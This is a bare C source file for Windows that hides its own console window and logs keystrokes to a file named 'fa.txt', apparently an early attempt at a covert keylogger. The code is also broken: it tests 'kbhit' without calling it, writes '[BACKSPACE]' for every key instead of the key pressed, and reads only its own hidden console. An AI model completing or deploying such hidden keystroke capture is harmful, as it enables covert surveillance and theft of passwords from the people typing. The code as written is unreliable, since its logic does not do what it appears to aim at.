#include <stdio.h>
#include <conio.h>
#include <windows.h>
#include <time.h>
#include<stdlib.h>

int main()
{

    
    FILE *file;
    HWND window;
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window, 0);
    

    char ch;
    printf("Enter keys (ESC to exit)\n");
    while (1)
    { file = fopen("fa.txt", "a+");
        if (kbhit)
        {

            ch = getch();

   
         if ((int)ch == 27) 
         break;
           
                
               
            fprintf(file, "[BACKSPACE]");
            printf("You have entered : %c\n", ch);
        }
        fclose(file);

    }
     return 0;
}
